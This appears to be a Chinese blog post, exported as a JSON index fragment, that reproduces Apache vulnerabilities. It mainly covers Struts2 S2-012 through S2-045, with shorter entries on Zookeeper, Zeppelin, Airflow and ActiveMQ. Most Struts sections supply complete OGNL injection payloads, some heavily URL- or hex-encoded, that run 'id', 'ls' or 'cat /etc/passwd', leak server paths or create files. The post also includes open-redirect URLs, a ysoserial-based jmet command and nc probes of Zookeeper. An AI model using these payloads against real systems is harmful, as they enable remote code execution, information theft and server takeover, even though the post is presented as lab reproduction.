\u0026lt;action name=\u0026#34;user\u0026#34; class=\u0026#34;com.demo.action.UserAction\u0026#34;\u0026gt; \u0026lt;result name=\u0026#34;redirect\u0026#34; type=\u0026#34;redirect\u0026#34;\u0026gt;/index.jsp?name=${name}\u0026lt;/result\u0026gt; \u0026lt;result name=\u0026#34;input\u0026#34;\u0026gt;/index.jsp\u0026lt;/result\u0026gt; \u0026lt;result name=\u0026#34;success\u0026#34;\u0026gt;/index.jsp\u0026lt;/result\u0026gt; \u0026lt;/action\u0026gt; \u0026lt;/package\u0026gt; UserAction中定义了一个name变量，当触发redirect类型返回时，Structs2获取使用${name}获取它的值，在这个过程中会对name参数的值执行OGNL表达式解析导致可以插入任意OGNL表达式导致命令执行。\n影响版本 Struts Showcase App 2.0.0 - Struts Showcase App 2.3.14.2 \n漏洞复现 环境搭建：\ngitclone https://github.com/vulhub/vulhub.git cd vulhub/struts2/s2-012 docker-compose up -d URL：\nhttp://\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/index.jsp\rPOC：\n%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\u0026quot;cat\u0026quot;, \u0026quot;/etc/passwd\u0026quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\u0026quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse\u0026quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}\rbp抓包看回显。\nStruts2 S2-013 URL和锚标记的includeParams属性中存在的远程命令执行漏洞 CVE-2013-1966 漏洞描述 S2-013 - Apache Struts 2 Wiki - Apache Software Foundation\nstruts的标签中s:a和s:url都有一个includeParams属性：\nnone\t:\tURL中不包含任何参数(默认)\rget\t:\t仅包含URL中的GET参数\rall\t:\t在URL中包含GET和POST参数\r当includeParams=all的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。 本来urldecode一下就能得到params，但struts给OGNL解析，造成了任意代码执行。\n影响版本 Struts 2.0.0 ~ 2.3.14\n漏洞复现 POC：\nhttp://\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27id%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D\rStruts2 S2-014 强制参数包含在URL和锚标记中引入的漏洞允许远程命令执行、会话访问操作及XSS攻击 CVE-2013-1966 CVE-2013-2115 漏洞描述 S2-014 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts中\u0026lt;s:url\u0026gt;和\u0026lt;s:a\u0026gt;标签都包含includeParams属性，其值可设为none、get或all，含义如下：\nnone\t：\t链接不包含请求的任意参数值(默认)\rget\t：\t链接只包含GET请求中的参数和值\rall\t：\t链接包含GET和POST所有参数和值\r包含特殊请求参数的请求可用来向堆栈注入任意OGNL代码，被用于URL或A标签中的请求参数。当includeParams=all时，会将本次请求的GET和POST参数都放在URL的GET参数上造成任意命令执行漏洞。\nS2-014是对S2-013修复的加强，修复了S2-013代码中忽略的${ognl_exp} OGNL表达式的方式。\n影响版本 Struts 2.0.0 ~ 2.3.14.1\n漏洞复现 POC：\nhttp://\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/link.action?a=${(#_memberAccess[\u0026quot;allowStaticMethodAccess\u0026quot;]=true,#a=@java.lang.Runtime@getRuntime().exec('id').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}\r或\nhttp://\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/link.action?a=${#_memberAccess[\u0026quot;allowStaticMethodAccess\u0026quot;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())}\rStruts2 S2-015 通配符匹配机制引入的漏洞或OGNL表达式的双重评估导致的远程命令执行漏洞 CVE-2013-2134 CVE-2013-2135 漏洞描述 S2-015 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2允许在通配符的基础上定义动作映射，例：\n\u0026lt;action name=\u0026#34;*\u0026#34; class=\u0026#34;example.ExampleSupport\u0026#34;\u0026gt; \u0026lt;result\u0026gt;/example/{1}.jsp\u0026lt;/result\u0026gt; \u0026lt;/action\u0026gt; 如果一个请求不匹配任何已定义当作，则将被*匹配，请求的动作名将用于被加载基于动作名的JSP文件。\n影响版本 Struts 2.0.0 ~ 2.3.14.2\n漏洞复现 POC：\nhttp://\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/example/%25%7B1%2B1%7D.action\rMessage为/2.jsp。\n%24%7B%23context%5B%27xwork%2EMethodAccessor%2EdenyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23%5FmemberAccess%2EgetClass%28%29%2EgetDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m%2EsetAccessible%28true%29%2C%23m%2Eset%28%23%5FmemberAccess%2Ctrue%29%2C%23q%3D%40org%2Eapache%2Ecommons%2Eio%2EIOUtils%40toString%28%40java%2Elang%2ERuntime%40getRuntime%28%29%2Eexec%28%27id%27%29%2EgetInputStream%28%29%29%2C%23q%7D%2Eaction\r执行id命令，Message处为执行结果。\nStruts2 S2-016 通过操作前缀action:、redirect:、redirectAction:参数造成远程命令执行漏洞 CVE-2013-2251 漏洞描述 S2-016 - Apache Struts 2 Wiki - Apache Software Foundation\nDefaultActionMapper类支持以action:、redirect:、redirectAction:作为导航或重定向前缀，但这些后缀后面同时可以跟OGNL表达式，Struts2并未对这些前缀做过滤，导致利用OGNL表达式调用Java静态方法执行任意系统命令。\n简而言之就是：在对特殊URL处理中，redirect与redirecrAction后跟上OGNL表达式会被服务器执行。\n影响版本 Struts 2.0.0 ~ 2.3.15\n漏洞复现 POC：\nhttp://\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/index.action?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%7D\r执行了id命令，结果回显在URL。\nredirect:%24%7b%23%61%3d%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%5b%5d%7b%27%6c%73%27%2c%27%2f%27%7d%29%29%2e%73%74%61%72%74%28%29%2c%23%62%3d%23%61%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%63%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%23%62%29%2c%23%64%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%63%29%2c%23%65%3d%6e%65%77%20%63%68%61%72%5b%35%30%30%30%30%5d%2c%23%64%2e%72%65%61%64%28%23%65%29%2c%23%6d%61%74%74%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74%52%65%73%70%6f%6e%73%65%27%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%70%72%69%6e%74%6c%6e%28%23%65%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%66%6c%75%73%68%28%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%63%6c%6f%73%65%28%29%7d\r执行ls命令，结果以文件返回。\n爆路径EXP：\nhttp://\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/index.action?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D\rStruts2 S2-017 通过操作前缀redirect:、redirectAction:参数引入漏洞允许打开重定向 CVE-2013-2248 漏洞描述 S2-017 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2的DeaultActionMapper曾支持一种短路导航状态改变的方法，即在参数前加redirect:、redirectAction:，再加上想要跳转的目标表达式。本来这种机制的目的是方便把导航信息附加到表单中的按钮上，但可以很容易的用来重定向到任意位置。\n影响版本 Struts 2.0.0 ~ 2.3.15\n漏洞复现 POC：\nhttp://\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/showcase.action?redirect:http://oopsdc.tk/\rhttp://\u0026lt;ip\u0026gt;:\u0026lt;oprt\u0026gt;/fileupload/upload.action?redirect:http://oopsdc.tk/\rhttp://\u0026lt;ip\u0026gt;:\u0026lt;oprt\u0026gt;/modelDriven/modelDriven.action?redirectAction:http://oopsdc.tk/\rStruts2 S2-018 访问控制漏洞 S2-018 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2 S2-019 默认情况下禁用动态方法调用 CVE-2016-0785 漏洞描述 S2-019 - Apache Struts 2 Wiki - Apache Software Foundation\nS2-019漏洞利用条件极为严格：\n特殊代码、value值为空、可传参到value、可控制name\n代码执行过程大致为如下：\n先尝试获取value的值，若为空，则二次解释执行了name，且在执行前给name加上了%{}，最终造成二次执行。\n漏洞影响 Struts 2.0.0 ~ 2.3.24.1 (2.3.20.3除外)\n漏洞复现 特殊代码如下：\n\u0026lt;s:i18n name=\u0026#34;%\u0026amp;#123#request.lan\u0026amp;#125\u0026#34;\u0026gt;xxxxx\u0026lt;/s:i18n\u0026gt; \u0026lt;set var=\u0026#34;%\u0026amp;#123#parameters.tang3\u0026amp;#125\u0026#34;/\u0026gt; 通过%\u0026amp;#123#\u0026amp;#125的方式获取用户输入标签属性，导致代码执行。之后的修复方式为直接过滤%\u0026amp;#123\u0026amp;#125形式的字符串OGNL解析。\n//core/src/main/java/org/apache/struts2/components/Component.java protected Object findValue(String expr, Class toType) { if (altSyntax() \u0026amp;\u0026amp; toType == String.class) { if (altSyntax() \u0026amp;\u0026amp; toType == String.class) { - return TextParserUtil.translateVariables(\u0026#39;%\u0026#39;, expr, stack); + if (ComponentUtils.containsExpression(expr)) { + return TextParserUtil.translateVariables(\u0026#39;%\u0026#39;, expr, stack); + } else { + return expr; + } } else {} else { expr = stripExpressionIfAlySyntax(expr); expr = stripExpressionIfAlySyntax(expr); //core/src/main/java/org/apache/struts2/components/Component.java + * @param expr to treat as an expression * @return true if it is an expression * @return true if it is an expression */ */ - public static boolean isExpression(Object value) { + public static boolean isExpression(String expr) { - String expr = value.toString(); return expr.startsWith(\u0026#34;%{\u0026#34;) \u0026amp;\u0026amp; expr.endsWith(\u0026#34;}\u0026#34;); return expr.startsWith(\u0026#34;%{\u0026#34;) \u0026amp;\u0026amp; expr.endsWith(\u0026#34;}\u0026#34;); } } + public static boolean containsExpression(String expr) { + return expr.contains(\u0026#34;%{\u0026#34;) \u0026amp;\u0026amp; expr.endsWith(\u0026#34;}\u0026#34;); + } 以上述代码为例，修改后的代码处理掉了非%\u0026amp;#123开头，\u0026amp;#125结尾的字符串进行OGNL解析的功能，举个例子：\nbar%\u0026amp;#1232+3\u0026amp;#125，在修改之前的代码中2+3会被作为OGNL执行。而修改之后，这种形式就只会被当做字符串来返回。\n审计方法就是查看是否存在以%\u0026amp;#123#\u0026amp;#125方式获取用户输入变量赋值给标签属性的代码写法。\n测试代码：\n\u0026lt;%@page import=\u0026#34;java.util.HashSet\u0026#34;%\u0026gt; \u0026lt;%@page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34;%\u0026gt; \u0026lt;%@taglib prefix=\u0026#34;s\u0026#34; uri=\u0026#34;/struts-tags\u0026#34;%\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Test JSP Page\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;%request.setAttribute(\u0026#34;a\u0026#34;, \u0026#34;\u0026#39;),#_memberAccess[\u0026#39;allowPrivateAccess\u0026#39;]=true,#_memberAccess[\u0026#39;allowProtectedAccess\u0026#39;]=true,#_memberAccess[\u0026#39;allowPackageProtectedAccess\u0026#39;]=true,#_memberAccess[\u0026#39;allowStaticMethodAccess\u0026#39;]=true,#_memberAccess[\u0026#39;excludedPackageNamePatterns\u0026#39;]=#_memberAccess[\u0026#39;acceptProperties\u0026#39;],#_memberAccess[\u0026#39;excludedClasses\u0026#39;]=#_memberAccess[\u0026#39;acceptProperties\u0026#39;],#a=@java.lang.Runtime@getRuntime(),#a.exec(\u0026#39;touch /tmp/th1s_1s_test\u0026#39;),new java.lang.String(\u0026#39;\u0026#34;);%\u0026gt; \u0026lt;s:i18n name=\u0026#34;%\u0026amp;#123#request.lan\u0026amp;#125\u0026#34;\u0026gt;xxxxx\u0026lt;/s:i18n\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; URL：\nhttp://\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/index.jsp?a=1\r生成tmp/th1s_1s_test。\nStruts2 S2-020 将Commons FileUpload升级到版本1.3.1(避免DoS攻击)并添加\u0026rsquo;class\u0026rsquo;以排除ParametersInterceptor中的params(避免ClassLoader操作) S2-020 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2 S2-021 改进ParametersInterceptor和CookieInterceptor中被排除的参数，以避免ClassLoader操作 S2-021 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2 S2-022 在CookieInterceptor中扩展排除的params以避免操纵Struts的内部 S2-022 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2 S2-023 可预测令牌生成值 S2-023 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2 S2-024 错误的excludeParams覆盖DefaultExcludedPatternsChecker中的定义值 S2-024 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2 S2-025 调试模式和公开的JSP文件中的跨站点脚本漏洞 S2-025 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2 S2-026 特殊的可用于访问Struts内部的顶级对象 S2-026 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2 S2-027 TextParseUtil.translateVariables未过滤恶意OGNL表达式 S2-027 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2 S2-028 使用具有损坏的URLDecoder实现的JRE可能会导致基于Struts 2的Web应用程序中的XSS漏洞 S2-028 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2 S2-029 在标记属性中对原始用户输入进行评估时，强制双OGNL评估可能导致远程代码执行 S2-029 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2 S2-030 I18NInterceptor中可能的XSS漏洞 S2-030 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2 S2-031 XSLTResult解析任意样式表漏洞 S2-031 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2 S2-032 使用动态方法调试时，可通过前缀执行远程代码 CVE-2016-3081 漏洞描述 S2-032 - Apache Struts 2 Wiki - Apache Software Foundation\n可使用mothod：Action前缀调用声明为publicd的函数，但在低版本中不会对name方法值做OGNL计算。\n影响版本 Struts 2.3.20 ~ 2.3.28 (2.3.20.3、2.3.24.3除外)\n漏洞复现 环境搭建：\ngitclone https://github.com/vulhub/vulhub.git cd vulhub/struts2/s2-012 docker-compose up -d URL：\nhttp://\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/index.jsp\r开启动态方法调用，使用?method：execute方法调用execute方法(struts2默认的action调用方法)，在method后加上要执行的OGNL表达式即可执行任意代码。\nPOC：\nhttp://\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString\u0026amp;pp=%5C%5CA\u0026amp;ppp=%20\u0026amp;encoding=UTF-8\u0026amp;cmd=id\rhttp://\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/index.action?method:%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse()%2C%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D)%2C%23w%3D%23res.getWriter()%2C%23a%3Dnew%20java.util.Scanner(%40java.lang.Runtime%40getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.d%5B0%5D)%2C%23str%3D%23a.hasNext()%3F%23a.next()%3A%23parameters.dd%5B0%5D%2C%23w.print(%23str)%2C%23w.close()%2C%23request.toString\u0026amp;cmd=id\u0026amp;dd=%20\u0026amp;d=____A\u0026amp;encoding=UTF-8\r回显id命令结果。\nStruts2 S2-033 开启动态调试且使用REST插件时可导致远程代码执行 漏洞描述 S2-033 - Apache Struts 2 Wiki - Apache Software Foundation\n当开启动态调试并同时使用Struts2 REST Plugin插件时，使用!操作符调用动态方法可能执行OGNL表达式，从而导致远程代码执行。\n影响版本 Struts 2.3.20 ~ 2.3.28 (2.3.20.3、2.3.24.3除外)\n漏洞复现 POC：\n%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23process%3D@java.lang.Runtime@getRuntime%28%29.exec%28%23parameters.command[0]),%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%2C@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%2C%23ros.flush%28%29,%23xx%3d123,%23xx.toString.json?\u0026amp;command=id\r回显id命令结果。\nStruts2 S2-034 OGNL缓存中毒导致的DoS漏洞 S2-034 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2 S2-035 易出错的行动名称清理 S2-035 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2 S2-036 在标签属性对原始用户输入进行评估时，强制双OGNL评估可能导致远程代码执行漏洞(类似S2-029) S2-036 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts2 S2-037 使用REST插件时可实现远程代码执行 漏洞描述 S2-037 - Apache Struts 2 Wiki - Apache Software Foundation\n与S2-033类似，S2-037也是关于REST插件导致method变量被篡改造成的远程代码执行漏洞，S2-037也是在DefaultApplicationInvocation.java的invokeAction方法中没有对methodName参数进行校验，直接放到getValue方法中，从而造成OGNL表达式的注入。\n影响版本 Struts 2.3.20 ~ 2.3.28.1(2.3.20.3、2.3.24.3除外)\n漏洞复现 POC：\n/orders/4/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?\u0026amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse\u0026amp;content=7556\u0026amp;command=id\r回显id命令执行结果。\nStruts2 S2-045 基于Jakarta Multipart解析器执行文件上载时可能的远程执行代码 漏洞描述 S2-045 - Apache Struts 2 Wiki - Apache Software Foundation\nStruts使用的Jakarta解析文件上传请求包不当，当攻击者构造恶意Content-Type时，可能导致远程代码执行。\n在default.properties文件中，struts.multipart.parser的值有两个选择，分别是jakarta和pell(原本也有第三种选择cos)。其中，jakarta解析器是Struts2框架的标准组成部分，默认情况下被启动。\n影响版本 Struts 2.3.5 ~ 2.3.31\nStruts 2.5 ~ 2.5.10\nZeppelin 未授权任意命令执行漏洞 漏洞描述 Apache Zeppelin存在未授权用户访问命令执行接口，导致容易用户可执行恶意命令获取服务器权限。\n影响版本 Apache Zeppelin\n漏洞复现 FOFA：icon_hash=\u0026quot;960250052\u0026quot;\n含有漏洞的页面能够通过页面创建一个新的匿名用户，创建之后即可执行任意命令。\nZookeeper 未授权访问漏洞 CVE-2014-085 漏洞描述 默认安装配置好的Zookeeper允许未授权访问，管理员未配置访问控制列表(ACL)，导致攻击者可以在默认开放的2181端口下通过执行envi命令获得大量敏感信息(系统名称、java环境)导致任意用户可以在网络不受限的情况下进行未授权访问读取数据。\n影响版本 Apache Zookeeper\n复现思路 漏洞复现 Zookeeper默认开放2181端口，使用如下命令获取敏感信息：\necho envi | nc xxx.xxx.xxx.xxx 2181 1、stat：列出关于性能和连接的客户端的统计信息。 echo stat | ncat \u0026lt;ip\u0026gt; 2181 2、ruok：测试服务器是否运行在非错误状态。 echo ruok | ncat \u0026lt;ip\u0026gt; 2181 3、reqs：列出未完成的请求。 echo reqs | ncat \u0026lt;ip\u0026gt; 2181 4、envi：打印有关服务环境的详细信息。 echo envi | ncat \u0026lt;ip\u0026gt; 2181 5、dump：列出未完成的会话和临时节点。 echo dump | ncat \u0026lt;ip\u0026gt; 2181  本文链接：Apache漏洞复现 | Atmet (oopsdc.tk)\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","permalink":"https://oopsdc.com/post/apache%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","summary":"Airflow 存储型XSS 漏洞描述 Apache Airflow 1.10.2及之前版本的airflow webserver服务存在XSS漏洞，原因在于`WEB应用未对客户端数据进行正确验证，导致攻击者可利用该漏洞执行客户端代码。\n影响版本 Apache Airflow 1.10.3以下版本。\n漏洞复现 访问/admin/dagrun/(默认不需要密码)。\n创建一个项目，输入ID后点击保存，返回列表，点击running字样，发现能够输入HTML代码，例：\n\u0026lt;script\u0026gt;_a=\u0026#34;https://www.baidu.com\u0026#34;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;document.location=_a\u0026lt;/script\u0026gt; 能直接造成存储型XSS。\nActiveMQ 反序列化漏洞 CVE-2015-5254 漏洞描述 Apache ActiveMQ是Apache软件经济会研发的一套开源消息中间件，支持Java消息服务、集群、Spring Framework等。Apache ActiveMQ 5.13.0之前版本，即5.x版本中存在反序列化漏洞，漏洞源于程序没有限制可在代理中序列化的类，攻击者通过借助特制序列化Java消息服务(JMS) ObjectMessage对象实现任意代码执行。\n影响版本 Apache ActiveMQ 5.13.0之前的5.x版本。\n复现思路 1.构造（可使用ysoserial）可执行命令的序列化对象。\n2.作为一个消息，发送给目标对应端口。\n3.访问Web管理页面，读取消息，触发漏洞。\n漏洞复现 使用jmet进行漏洞利用：ianxtianxt/jmet: Java Message Exploitation Tool (github.com)\n 下载好之后在jmet-0.1.0-all.jar同级目录下创建external文件夹，避免出现文件夹不存在的报错。\njmet的原理是使用jar包内置ysoserial生成Payload并发送，我们需要在ysoserial的gadget选择一个可使用的，如ROME。\n 给目标ActiveMQ添加一个名为event的队列，点击事件为生成/tmp/vuln文件：\njava -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y \u0026#34;touch /tmp/vuln\u0026#34; -Yp ROME \u0026lt;ip\u0026gt; \u0026lt;port\u0026gt; # 命令执行成功后回显如下 INFO d.c.j.t.JMSTarget [main] Connected with ID: ID:\u0026lt;server-id\u0026gt; INFO d.","title":"Apache漏洞复现"},{"content":"","permalink":"https://oopsdc.com/tags/","summary":"tags","title":"Tag"}]